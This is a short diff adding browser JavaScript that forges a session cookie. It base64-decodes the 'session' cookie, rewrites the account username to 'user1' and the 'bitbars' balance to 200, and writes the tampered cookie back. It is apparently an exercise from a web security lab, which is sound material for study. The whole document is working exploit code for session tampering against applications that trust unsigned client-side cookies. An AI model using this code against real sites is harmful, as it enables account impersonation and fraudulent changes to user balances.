@@ -1,0 +1,7 @@
+var cookie = document.cookie.split("session=")[1];
+var json = atob(cookie);
+var jsonObj = JSON.parse(json);
+jsonObj.account.username = "user1";
+jsonObj.account.bitbars = 200;
+var forged_cookie= JSON.stringify(jsonObj);
+document.cookie = "session=".concat(btoa(forged_cookie));
